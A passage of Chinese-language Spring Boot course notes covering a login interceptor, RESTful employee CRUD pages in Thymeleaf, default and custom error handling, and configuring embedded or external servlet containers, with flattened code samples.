注册拦截器 1234567891011121314151617181920212223//所有的WebMvcConfigurerAdapter组件都会一起起作用 @Bean //将组件注册在容器 public WebMvcConfigurerAdapter webMvcConfigurerAdapter()&#123; WebMvcConfigurerAdapter adapter = new WebMvcConfigurerAdapter() &#123; @Override public void addViewControllers(ViewControllerRegistry registry) &#123; registry.addViewController(\"/\").setViewName(\"login\"); registry.addViewController(\"/index.html\").setViewName(\"login\"); registry.addViewController(\"/main.html\").setViewName(\"dashboard\"); &#125; //注册拦截器 @Override public void addInterceptors(InterceptorRegistry registry) &#123; //super.addInterceptors(registry); //静态资源； *.css , *.js //SpringBoot已经做好了静态资源映射 registry.addInterceptor(new LoginHandlerInterceptor()).addPathPatterns(\"/**\") .excludePathPatterns(\"/index.html\",\"/\",\"/user/login\"); &#125; &#125;; return adapter; &#125; 5）、CRUD-员工列表实验要求： 1）、RestfulCRUD：CRUD满足Rest风格； URI： /资源名称/资源标识 HTTP请求方式区分对资源CRUD操作 普通CRUD（uri来区分操作） RestfulCRUD 查询 getEmp emp—-GET 添加 addEmp?xxx emp—-POST 修改 updateEmp?id=xxx&amp;xxx=xx emp/{id}—-PUT 删除 deleteEmp?id=1 emp/{id}—-DELETE 2）、实验的请求架构; 实验功能 请求URI 请求方式 查询所有员工 emps GET 查询某个员工(来到修改页面) emp/1 GET 来到添加页面 emp GET 添加员工 emp POST 来到修改页面（查出员工进行信息回显） emp/1 GET 修改员工 emp PUT 删除员工 emp/1 DELETE 3）、员工列表： thymeleaf公共页面元素抽取12345678910111213141、抽取公共片段&lt;div th:fragment=\"copy\"&gt;&amp;copy; 2011 The Good Thymes Virtual Grocery&lt;/div&gt;2、引入公共片段&lt;div th:insert=\"~&#123;footer :: copy&#125;\"&gt;&lt;/div&gt;~&#123;templatename::selector&#125;：模板名::选择器~&#123;templatename::fragmentname&#125;:模板名::片段名3、默认效果：insert的公共片段在div标签中如果使用th:insert等属性进行引入，可以不用写~&#123;&#125;：行内写法可以加上：[[~&#123;&#125;]];[(~&#123;&#125;)]； 三种引入公共片段的th属性： th:insert：将公共片段整个插入到声明引入的元素中 th:replace：将声明引入的元素替换为公共片段 th:include：将被引入的片段的内容包含进这个标签中 1234567891011121314151617181920212223&lt;footer th:fragment=\"copy\"&gt;&amp;copy; 2011 The Good Thymes Virtual Grocery&lt;/footer&gt;引入方式&lt;div th:insert=\"footer :: copy\"&gt;&lt;/div&gt;&lt;div th:replace=\"footer :: copy\"&gt;&lt;/div&gt;&lt;div th:include=\"footer :: copy\"&gt;&lt;/div&gt;效果&lt;div&gt; &lt;footer&gt; &amp;copy; 2011 The Good Thymes Virtual Grocery &lt;/footer&gt;&lt;/div&gt;&lt;footer&gt;&amp;copy; 2011 The Good Thymes Virtual Grocery&lt;/footer&gt;&lt;div&gt;&amp;copy; 2011 The Good Thymes Virtual Grocery&lt;/div&gt; 引入片段的时候传入参数： 123456789101112131415161718&lt;nav class=\"col-md-2 d-none d-md-block bg-light sidebar\" id=\"sidebar\"&gt; &lt;div class=\"sidebar-sticky\"&gt; &lt;ul class=\"nav flex-column\"&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link active\" th:class=\"$&#123;activeUri=='main.html'?'nav-link active':'nav-link'&#125;\" href=\"#\" th:href=\"@&#123;/main.html&#125;\"&gt; &lt;svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-home\"&gt; &lt;path d=\"M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z\"&gt;&lt;/path&gt; &lt;polyline points=\"9 22 9 12 15 12 15 22\"&gt;&lt;/polyline&gt; &lt;/svg&gt; Dashboard &lt;span class=\"sr-only\"&gt;(current)&lt;/span&gt; &lt;/a&gt; &lt;/li&gt;&lt;!--引入侧边栏;传入参数--&gt;&lt;div th:replace=\"commons/bar::#sidebar(activeUri='emps')\"&gt;&lt;/div&gt; 6）、CRUD-员工添加添加页面 123456789101112131415161718192021222324252627282930313233343536&lt;form&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;LastName&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" placeholder=\"zhangsan\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Email&lt;/label&gt; &lt;input type=\"email\" class=\"form-control\" placeholder=\"zhangsan@atguigu.com\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Gender&lt;/label&gt;&lt;br/&gt; &lt;div class=\"form-check form-check-inline\"&gt; &lt;input class=\"form-check-input\" type=\"radio\" name=\"gender\" value=\"1\"&gt; &lt;label class=\"form-check-label\"&gt;男&lt;/label&gt; &lt;/div&gt; &lt;div class=\"form-check form-check-inline\"&gt; &lt;input class=\"form-check-input\" type=\"radio\" name=\"gender\" value=\"0\"&gt; &lt;label class=\"form-check-label\"&gt;女&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;department&lt;/label&gt; &lt;select class=\"form-control\"&gt; &lt;option&gt;1&lt;/option&gt; &lt;option&gt;2&lt;/option&gt; &lt;option&gt;3&lt;/option&gt; &lt;option&gt;4&lt;/option&gt; &lt;option&gt;5&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Birth&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" placeholder=\"zhangsan\"&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-primary\"&gt;添加&lt;/button&gt;&lt;/form&gt; 提交的数据格式不对：生日：日期； 2017-12-12；2017/12/12；2017.12.12； 日期的格式化；SpringMVC将页面提交的值需要转换为指定的类型; 2017-12-12—-Date； 类型转换，格式化; 默认日期是按照/的方式； 7）、CRUD-员工修改修改添加二合一表单 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!--需要区分是员工修改还是添加；--&gt;&lt;form th:action=\"@&#123;/emp&#125;\" method=\"post\"&gt; &lt;!--发送put请求修改员工数据--&gt; &lt;!--1、SpringMVC中配置HiddenHttpMethodFilter;（SpringBoot自动配置好的）2、页面创建一个post表单3、创建一个input项，name=\"_method\";值就是我们指定的请求方式--&gt; &lt;input type=\"hidden\" name=\"_method\" value=\"put\" th:if=\"$&#123;emp!=null&#125;\"/&gt; &lt;input type=\"hidden\" name=\"id\" th:if=\"$&#123;emp!=null&#125;\" th:value=\"$&#123;emp.id&#125;\"&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;LastName&lt;/label&gt; &lt;input name=\"lastName\" type=\"text\" class=\"form-control\" placeholder=\"zhangsan\" th:value=\"$&#123;emp!=null&#125;?$&#123;emp.lastName&#125;\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Email&lt;/label&gt; &lt;input name=\"email\" type=\"email\" class=\"form-control\" placeholder=\"zhangsan@atguigu.com\" th:value=\"$&#123;emp!=null&#125;?$&#123;emp.email&#125;\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Gender&lt;/label&gt;&lt;br/&gt; &lt;div class=\"form-check form-check-inline\"&gt; &lt;input class=\"form-check-input\" type=\"radio\" name=\"gender\" value=\"1\" th:checked=\"$&#123;emp!=null&#125;?$&#123;emp.gender==1&#125;\"&gt; &lt;label class=\"form-check-label\"&gt;男&lt;/label&gt; &lt;/div&gt; &lt;div class=\"form-check form-check-inline\"&gt; &lt;input class=\"form-check-input\" type=\"radio\" name=\"gender\" value=\"0\" th:checked=\"$&#123;emp!=null&#125;?$&#123;emp.gender==0&#125;\"&gt; &lt;label class=\"form-check-label\"&gt;女&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;department&lt;/label&gt; &lt;!--提交的是部门的id--&gt; &lt;select class=\"form-control\" name=\"department.id\"&gt; &lt;option th:selected=\"$&#123;emp!=null&#125;?$&#123;dept.id == emp.department.id&#125;\" th:value=\"$&#123;dept.id&#125;\" th:each=\"dept:$&#123;depts&#125;\" th:text=\"$&#123;dept.departmentName&#125;\"&gt;1&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Birth&lt;/label&gt; &lt;input name=\"birth\" type=\"text\" class=\"form-control\" placeholder=\"zhangsan\" th:value=\"$&#123;emp!=null&#125;?$&#123;#dates.format(emp.birth, 'yyyy-MM-dd HH:mm')&#125;\"&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-primary\" th:text=\"$&#123;emp!=null&#125;?'修改':'添加'\"&gt;添加&lt;/button&gt;&lt;/form&gt; 8）、CRUD-员工删除123456789101112131415161718192021&lt;tr th:each=\"emp:$&#123;emps&#125;\"&gt; &lt;td th:text=\"$&#123;emp.id&#125;\"&gt;&lt;/td&gt; &lt;td&gt;[[$&#123;emp.lastName&#125;]]&lt;/td&gt; &lt;td th:text=\"$&#123;emp.email&#125;\"&gt;&lt;/td&gt; &lt;td th:text=\"$&#123;emp.gender&#125;==0?'女':'男'\"&gt;&lt;/td&gt; &lt;td th:text=\"$&#123;emp.department.departmentName&#125;\"&gt;&lt;/td&gt; &lt;td th:text=\"$&#123;#dates.format(emp.birth, 'yyyy-MM-dd HH:mm')&#125;\"&gt;&lt;/td&gt; &lt;td&gt; &lt;a class=\"btn btn-sm btn-primary\" th:href=\"@&#123;/emp/&#125;+$&#123;emp.id&#125;\"&gt;编辑&lt;/a&gt; &lt;button th:attr=\"del_uri=@&#123;/emp/&#125;+$&#123;emp.id&#125;\" class=\"btn btn-sm btn-danger deleteBtn\"&gt;删除&lt;/button&gt; &lt;/td&gt;&lt;/tr&gt;&lt;script&gt; $(\".deleteBtn\").click(function()&#123; //删除当前员工的 $(\"#deleteEmpForm\").attr(\"action\",$(this).attr(\"del_uri\")).submit(); return false; &#125;);&lt;/script&gt; 7、错误处理机制1）、SpringBoot默认的错误处理机制默认效果： ​ 1）、浏览器，返回一个默认的错误页面 浏览器发送请求的请求头： ​ 2）、如果是其他客户端，默认响应一个json数据 ​ 原理： ​ 可以参照ErrorMvcAutoConfiguration；错误处理的自动配置； 给容器中添加了以下组件 ​ 1、DefaultErrorAttributes： 1234567891011帮我们在页面共享信息；@Override public Map&lt;String, Object&gt; getErrorAttributes(RequestAttributes requestAttributes, boolean includeStackTrace) &#123; Map&lt;String, Object&gt; errorAttributes = new LinkedHashMap&lt;String, Object&gt;(); errorAttributes.put(\"timestamp\", new Date()); addStatus(errorAttributes, requestAttributes); addErrorDetails(errorAttributes, requestAttributes, includeStackTrace); addPath(errorAttributes, requestAttributes); return errorAttributes; &#125; ​ 2、BasicErrorController：处理默认/error请求 12345678910111213141516171819202122232425@Controller@RequestMapping(\"$&#123;server.error.path:$&#123;error.path:/error&#125;&#125;\")public class BasicErrorController extends AbstractErrorController &#123; @RequestMapping(produces = \"text/html\")//产生html类型的数据；浏览器发送的请求来到这个方法处理 public ModelAndView errorHtml(HttpServletRequest request, HttpServletResponse response) &#123; HttpStatus status = getStatus(request); Map&lt;String, Object&gt; model = Collections.unmodifiableMap(getErrorAttributes( request, isIncludeStackTrace(request, MediaType.TEXT_HTML))); response.setStatus(status.value()); //去哪个页面作为错误页面；包含页面地址和页面内容 ModelAndView modelAndView = resolveErrorView(request, response, status, model); return (modelAndView == null ? new ModelAndView(\"error\", model) : modelAndView); &#125; @RequestMapping @ResponseBody //产生json数据，其他客户端来到这个方法处理； public ResponseEntity&lt;Map&lt;String, Object&gt;&gt; error(HttpServletRequest request) &#123; Map&lt;String, Object&gt; body = getErrorAttributes(request, isIncludeStackTrace(request, MediaType.ALL)); HttpStatus status = getStatus(request); return new ResponseEntity&lt;Map&lt;String, Object&gt;&gt;(body, status); &#125; ​ 3、ErrorPageCustomizer： 12@Value(\"$&#123;error.path:/error&#125;\")private String path = \"/error\"; 系统出现错误以后来到error请求进行处理；（web.xml注册的错误页面规则） ​ 4、DefaultErrorViewResolver： 123456789101112131415161718192021222324@Override public ModelAndView resolveErrorView(HttpServletRequest request, HttpStatus status, Map&lt;String, Object&gt; model) &#123; ModelAndView modelAndView = resolve(String.valueOf(status), model); if (modelAndView == null &amp;&amp; SERIES_VIEWS.containsKey(status.series())) &#123; modelAndView = resolve(SERIES_VIEWS.get(status.series()), model); &#125; return modelAndView; &#125; private ModelAndView resolve(String viewName, Map&lt;String, Object&gt; model) &#123; //默认SpringBoot可以去找到一个页面？ error/404 String errorViewName = \"error/\" + viewName; //模板引擎可以解析这个页面地址就用模板引擎解析 TemplateAvailabilityProvider provider = this.templateAvailabilityProviders .getProvider(errorViewName, this.applicationContext); if (provider != null) &#123; //模板引擎可用的情况下返回到errorViewName指定的视图地址 return new ModelAndView(errorViewName, model); &#125; //模板引擎不可用，就在静态资源文件夹下找errorViewName对应的页面 error/404.html return resolveResource(errorViewName, model); &#125; ​ 步骤： ​ 一但系统出现4xx或者5xx之类的错误；ErrorPageCustomizer就会生效（定制错误的响应规则）；就会来到/error请求；就会被BasicErrorController处理； ​ 1）响应页面；去哪个页面是由DefaultErrorViewResolver解析得到的； 1234567891011protected ModelAndView resolveErrorView(HttpServletRequest request, HttpServletResponse response, HttpStatus status, Map&lt;String, Object&gt; model) &#123; //所有的ErrorViewResolver得到ModelAndView for (ErrorViewResolver resolver : this.errorViewResolvers) &#123; ModelAndView modelAndView = resolver.resolveErrorView(request, status, model); if (modelAndView != null) &#123; return modelAndView; &#125; &#125; return null;&#125; 2）、如果定制错误响应：1）、如何定制错误的页面；​ 1）、有模板引擎的情况下；error/状态码; 【将错误页面命名为 错误状态码.html 放在模板引擎文件夹里面的 error文件夹下】，发生此状态码的错误就会来到 对应的页面； ​ 我们可以使用4xx和5xx作为错误页面的文件名来匹配这种类型的所有错误，精确优先（优先寻找精确的状态码.html）； ​ 页面能获取的信息； ​ timestamp：时间戳 ​ status：状态码 ​ error：错误提示 ​ exception：异常对象 ​ message：异常消息 ​ errors：JSR303数据校验的错误都在这里 ​ 2）、没有模板引擎（模板引擎找不到这个错误页面），静态资源文件夹下找； ​ 3）、以上都没有错误页面，就是默认来到SpringBoot默认的错误提示页面； 2）、如何定制错误的json数据；​ 1）、自定义异常处理&amp;返回定制json数据； 12345678910111213@ControllerAdvicepublic class MyExceptionHandler &#123; @ResponseBody @ExceptionHandler(UserNotExistException.class) public Map&lt;String,Object&gt; handleException(Exception e)&#123; Map&lt;String,Object&gt; map = new HashMap&lt;&gt;(); map.put(\"code\",\"user.notexist\"); map.put(\"message\",e.getMessage()); return map; &#125;&#125;//没有自适应效果... ​ 2）、转发到/error进行自适应响应效果处理 1234567891011121314@ExceptionHandler(UserNotExistException.class) public String handleException(Exception e, HttpServletRequest request)&#123; Map&lt;String,Object&gt; map = new HashMap&lt;&gt;(); //传入我们自己的错误状态码 4xx 5xx，否则就不会进入定制错误页面的解析流程 /** * Integer statusCode = (Integer) request .getAttribute(\"javax.servlet.error.status_code\"); */ request.setAttribute(\"javax.servlet.error.status_code\",500); map.put(\"code\",\"user.notexist\"); map.put(\"message\",e.getMessage()); //转发到/error return \"forward:/error\"; &#125; 3）、将我们的定制数据携带出去；出现错误以后，会来到/error请求，会被BasicErrorController处理，响应出去可以获取的数据是由getErrorAttributes得到的（是AbstractErrorController（ErrorController）规定的方法）； ​ 1、完全来编写一个ErrorController的实现类【或者是编写AbstractErrorController的子类】，放在容器中； ​ 2、页面上能用的数据，或者是json返回能用的数据都是通过errorAttributes.getErrorAttributes得到； ​ 容器中DefaultErrorAttributes.getErrorAttributes()；默认进行数据处理的； 自定义ErrorAttributes 1234567891011//给容器中加入我们自己定义的ErrorAttributes@Componentpublic class MyErrorAttributes extends DefaultErrorAttributes &#123; @Override public Map&lt;String, Object&gt; getErrorAttributes(RequestAttributes requestAttributes, boolean includeStackTrace) &#123; Map&lt;String, Object&gt; map = super.getErrorAttributes(requestAttributes, includeStackTrace); map.put(\"company\",\"atguigu\"); return map; &#125;&#125; 最终的效果：响应是自适应的，可以通过定制ErrorAttributes改变需要返回的内容， 8、配置嵌入式Servlet容器SpringBoot默认使用Tomcat作为嵌入式的Servlet容器； 问题？ 1）、如何定制和修改Servlet容器的相关配置；1、修改和server有关的配置（ServerProperties【也是EmbeddedServletContainerCustomizer】）； 123456789server.port=8081server.context-path=/crudserver.tomcat.uri-encoding=UTF-8//通用的Servlet容器设置server.xxx//Tomcat的设置server.tomcat.xxx 2、编写一个EmbeddedServletContainerCustomizer：嵌入式的Servlet容器的定制器；来修改Servlet容器的配置 1234567891011@Bean //一定要将这个定制器加入到容器中public EmbeddedServletContainerCustomizer embeddedServletContainerCustomizer()&#123; return new EmbeddedServletContainerCustomizer() &#123; //定制嵌入式的Servlet容器相关的规则 @Override public void customize(ConfigurableEmbeddedServletContainer container) &#123; container.setPort(8083); &#125; &#125;;&#125; 2）、注册Servlet三大组件【Servlet、Filter、Listener】由于SpringBoot默认是以jar包的方式启动嵌入式的Servlet容器来启动SpringBoot的web应用，没有web.xml文件。 注册三大组件用以下方式 ServletRegistrationBean 123456//注册三大组件@Beanpublic ServletRegistrationBean myServlet()&#123; ServletRegistrationBean registrationBean = new ServletRegistrationBean(new MyServlet(),\"/myServlet\"); return registrationBean;&#125; FilterRegistrationBean 1234567@Beanpublic FilterRegistrationBean myFilter()&#123; FilterRegistrationBean registrationBean = new FilterRegistrationBean(); registrationBean.setFilter(new MyFilter()); registrationBean.setUrlPatterns(Arrays.asList(\"/hello\",\"/myServlet\")); return registrationBean;&#125; ServletListenerRegistrationBean 12345@Beanpublic ServletListenerRegistrationBean myListener()&#123; ServletListenerRegistrationBean&lt;MyListener&gt; registrationBean = new ServletListenerRegistrationBean&lt;&gt;(new MyListener()); return registrationBean;&#125; SpringBoot帮我们自动SpringMVC的时候，自动的注册SpringMVC的前端控制器；DIspatcherServlet； DispatcherServletAutoConfiguration中： 1234567891011121314151617@Bean(name = DEFAULT_DISPATCHER_SERVLET_REGISTRATION_BEAN_NAME)@ConditionalOnBean(value = DispatcherServlet.class, name = DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)public ServletRegistrationBean dispatcherServletRegistration( DispatcherServlet dispatcherServlet) &#123; ServletRegistrationBean registration = new ServletRegistrationBean( dispatcherServlet, this.serverProperties.getServletMapping()); //默认拦截： / 所有请求；包静态资源，但是不拦截jsp请求； /*会拦截jsp //可以通过server.servletPath来修改SpringMVC前端控制器默认拦截的请求路径 registration.setName(DEFAULT_DISPATCHER_SERVLET_BEAN_NAME); registration.setLoadOnStartup( this.webMvcProperties.getServlet().getLoadOnStartup()); if (this.multipartConfig != null) &#123; registration.setMultipartConfig(this.multipartConfig); &#125; return registration;&#125; 2）、SpringBoot能不能支持其他的Servlet容器； 3）、替换为其他嵌入式Servlet容器 默认支持： Tomcat（默认使用） 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; 引入web模块默认就是使用嵌入式的Tomcat作为Servlet容器；&lt;/dependency&gt; Jetty 1234567891011121314151617&lt;!-- 引入web模块 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;!--引入其他的Servlet容器--&gt;&lt;dependency&gt; &lt;artifactId&gt;spring-boot-starter-jetty&lt;/artifactId&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;/dependency&gt; Undertow 1234567891011121314151617&lt;!-- 引入web模块 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;!--引入其他的Servlet容器--&gt;&lt;dependency&gt; &lt;artifactId&gt;spring-boot-starter-undertow&lt;/artifactId&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;/dependency&gt; 4）、嵌入式Servlet容器自动配置原理；EmbeddedServletContainerAutoConfiguration：嵌入式的Servlet容器自动配置？ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE)@Configuration@ConditionalOnWebApplication@Import(BeanPostProcessorsRegistrar.class)//导入BeanPostProcessorsRegistrar：Spring注解版；给容器中导入一些组件//导入了EmbeddedServletContainerCustomizerBeanPostProcessor：//后置处理器：bean初始化前后（创建完对象，还没赋值赋值）执行初始化工作public class EmbeddedServletContainerAutoConfiguration &#123; @Configuration @ConditionalOnClass(&#123; Servlet.class, Tomcat.class &#125;)//判断当前是否引入了Tomcat依赖； @ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT)//判断当前容器没有用户自己定义EmbeddedServletContainerFactory：嵌入式的Servlet容器工厂；作用：创建嵌入式的Servlet容器 public static class EmbeddedTomcat &#123; @Bean public TomcatEmbeddedServletContainerFactory tomcatEmbeddedServletContainerFactory() &#123; return new TomcatEmbeddedServletContainerFactory(); &#125; &#125; /** * Nested configuration if Jetty is being used. */ @Configuration @ConditionalOnClass(&#123; Servlet.class, Server.class, Loader.class, WebAppContext.class &#125;) @ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT) public static class EmbeddedJetty &#123; @Bean public JettyEmbeddedServletContainerFactory jettyEmbeddedServletContainerFactory() &#123; return new JettyEmbeddedServletContainerFactory(); &#125; &#125; /** * Nested configuration if Undertow is being used. */ @Configuration @ConditionalOnClass(&#123; Servlet.class, Undertow.class, SslClientAuthMode.class &#125;) @ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT) public static class EmbeddedUndertow &#123; @Bean public UndertowEmbeddedServletContainerFactory undertowEmbeddedServletContainerFactory() &#123; return new UndertowEmbeddedServletContainerFactory(); &#125; &#125; 1）、EmbeddedServletContainerFactory（嵌入式Servlet容器工厂） 1234567public interface EmbeddedServletContainerFactory &#123; //获取嵌入式的Servlet容器 EmbeddedServletContainer getEmbeddedServletContainer( ServletContextInitializer... initializers);&#125; 2）、EmbeddedServletContainer：（嵌入式的Servlet容器） 3）、以TomcatEmbeddedServletContainerFactory为例 123456789101112131415161718192021222324@Overridepublic EmbeddedServletContainer getEmbeddedServletContainer( ServletContextInitializer... initializers) &#123; //创建一个Tomcat Tomcat tomcat = new Tomcat(); //配置Tomcat的基本环节 File baseDir = (this.baseDirectory != null ? this.baseDirectory : createTempDir(\"tomcat\")); tomcat.setBaseDir(baseDir.getAbsolutePath()); Connector connector = new Connector(this.protocol); tomcat.getService().addConnector(connector); customizeConnector(connector); tomcat.setConnector(connector); tomcat.getHost().setAutoDeploy(false); configureEngine(tomcat.getEngine()); for (Connector additionalConnector : this.additionalTomcatConnectors) &#123; tomcat.getService().addConnector(additionalConnector); &#125; prepareContext(tomcat.getHost(), initializers); //将配置好的Tomcat传入进去，返回一个EmbeddedServletContainer；并且启动Tomcat服务器 return getTomcatEmbeddedServletContainer(tomcat);&#125; 4）、我们对嵌入式容器的配置修改是怎么生效？ 1ServerProperties、EmbeddedServletContainerCustomizer EmbeddedServletContainerCustomizer：定制器帮我们修改了Servlet容器的配置？ 怎么修改的原理？ 5）、容器中导入了EmbeddedServletContainerCustomizerBeanPostProcessor 12345678910111213141516171819202122232425262728293031323334353637//初始化之前@Overridepublic Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException &#123; //如果当前初始化的是一个ConfigurableEmbeddedServletContainer类型的组件 if (bean instanceof ConfigurableEmbeddedServletContainer) &#123; // postProcessBeforeInitialization((ConfigurableEmbeddedServletContainer) bean); &#125; return bean;&#125;private void postProcessBeforeInitialization( ConfigurableEmbeddedServletContainer bean) &#123; //获取所有的定制器，调用每一个定制器的customize方法来给Servlet容器进行属性赋值； for (EmbeddedServletContainerCustomizer customizer : getCustomizers()) &#123; customizer.customize(bean); &#125;&#125;private Collection&lt;EmbeddedServletContainerCustomizer&gt; getCustomizers() &#123; if (this.customizers == null) &#123; // Look up does not include the parent context this.customizers = new ArrayList&lt;EmbeddedServletContainerCustomizer&gt;( this.beanFactory //从容器中获取所有这葛类型的组件：EmbeddedServletContainerCustomizer //定制Servlet容器，给容器中可以添加一个EmbeddedServletContainerCustomizer类型的组件 .getBeansOfType(EmbeddedServletContainerCustomizer.class, false, false) .values()); Collections.sort(this.customizers, AnnotationAwareOrderComparator.INSTANCE); this.customizers = Collections.unmodifiableList(this.customizers); &#125; return this.customizers;&#125;ServerProperties也是定制器 步骤： 1）、SpringBoot根据导入的依赖情况，给容器中添加相应的EmbeddedServletContainerFactory【TomcatEmbeddedServletContainerFactory】 2）、容器中某个组件要创建对象就会惊动后置处理器；EmbeddedServletContainerCustomizerBeanPostProcessor； 只要是嵌入式的Servlet容器工厂，后置处理器就工作； 3）、后置处理器，从容器中获取所有的EmbeddedServletContainerCustomizer，调用定制器的定制方法 5）、嵌入式Servlet容器启动原理；什么时候创建嵌入式的Servlet容器工厂？什么时候获取嵌入式的Servlet容器并启动Tomcat； 获取嵌入式的Servlet容器工厂： 1）、SpringBoot应用启动运行run方法 2）、refreshContext(context);SpringBoot刷新IOC容器【创建IOC容器对象，并初始化容器，创建容器中的每一个组件】；如果是web应用创建AnnotationConfigEmbeddedWebApplicationContext，否则：AnnotationConfigApplicationContext 3）、refresh(context);刷新刚才创建好的ioc容器； 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263public void refresh() throws BeansException, IllegalStateException &#123; synchronized (this.startupShutdownMonitor) &#123; // Prepare this context for refreshing. prepareRefresh(); // Tell the subclass to refresh the internal bean factory. ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory(); // Prepare the bean factory for use in this context. prepareBeanFactory(beanFactory); try &#123; // Allows post-processing of the bean factory in context subclasses. postProcessBeanFactory(beanFactory); // Invoke factory processors registered as beans in the context. invokeBeanFactoryPostProcessors(beanFactory); // Register bean processors that intercept bean creation. registerBeanPostProcessors(beanFactory); // Initialize message source for this context. initMessageSource(); // Initialize event multicaster for this context. initApplicationEventMulticaster(); // Initialize other special beans in specific context subclasses. onRefresh(); // Check for listener beans and register them. registerListeners(); // Instantiate all remaining (non-lazy-init) singletons. finishBeanFactoryInitialization(beanFactory); // Last step: publish corresponding event. finishRefresh(); &#125; catch (BeansException ex) &#123; if (logger.isWarnEnabled()) &#123; logger.warn(\"Exception encountered during context initialization - \" + \"cancelling refresh attempt: \" + ex); &#125; // Destroy already created singletons to avoid dangling resources. destroyBeans(); // Reset 'active' flag. cancelRefresh(ex); // Propagate exception to caller. throw ex; &#125; finally &#123; // Reset common introspection caches in Spring's core, since we // might not ever need metadata for singleton beans anymore... resetCommonCaches(); &#125; &#125;&#125; 4）、 onRefresh(); web的ioc容器重写了onRefresh方法 5）、webioc容器会创建嵌入式的Servlet容器；createEmbeddedServletContainer(); 6）、获取嵌入式的Servlet容器工厂： EmbeddedServletContainerFactory containerFactory = getEmbeddedServletContainerFactory(); ​ 从ioc容器中获取EmbeddedServletContainerFactory 组件；TomcatEmbeddedServletContainerFactory创建对象，后置处理器一看是这个对象，就获取所有的定制器来先定制Servlet容器的相关配置； 7）、使用容器工厂获取嵌入式的Servlet容器：this.embeddedServletContainer = containerFactory .getEmbeddedServletContainer(getSelfInitializer()); 8）、嵌入式的Servlet容器创建对象并启动Servlet容器； 先启动嵌入式的Servlet容器，再将ioc容器中剩下没有创建出的对象获取出来； ==IOC容器启动创建嵌入式的Servlet容器== 9、使用外置的Servlet容器嵌入式Servlet容器：应用打成可执行的jar ​ 优点：简单、便携； ​ 缺点：默认不支持JSP、优化定制比较复杂（使用定制器【ServerProperties、自定义EmbeddedServletContainerCustomizer】，自己编写嵌入式Servlet容器的创建工厂【EmbeddedServletContainerFactory】）； 外置的Servlet容器：外面安装Tomcat—-应用war包的方式打包； 步骤1）、必须创建一个war项目；（利用idea创建好目录结构） 2）、将嵌入式的Tomcat指定为provided； 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; 3）、必须编写一个SpringBootServletInitializer的子类，并调用configure方法 123456789public class ServletInitializer extends SpringBootServletInitializer &#123; @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder application) &#123; //传入SpringBoot应用的主程序 return application.sources(SpringBoot04WebJspApplication.class); &#125;&#125; 4）、启动服务器就可以使用； 原理jar包：执行SpringBoot主类的main方法，启动ioc容器，创建嵌入式的Servlet容器； war包：启动服务器，服务器启动SpringBoot应用【SpringBootServletInitializer】，启动ioc容器； servlet3.0（Spring注解版）： 8.2.4 Shared libraries / runtimes pluggability： 规则： ​ 1）、服务器启动（web应用启动）会创建当前web应用里面每一个jar包里面ServletContainerInitializer实例： ​ 2）、ServletContainerInitializer的实现放在jar包的META-INF/services文件夹下，有一个名为javax.servlet.ServletContainerInitializer的文件，内容就是ServletContainerInitializer的实现类的全类名 ​ 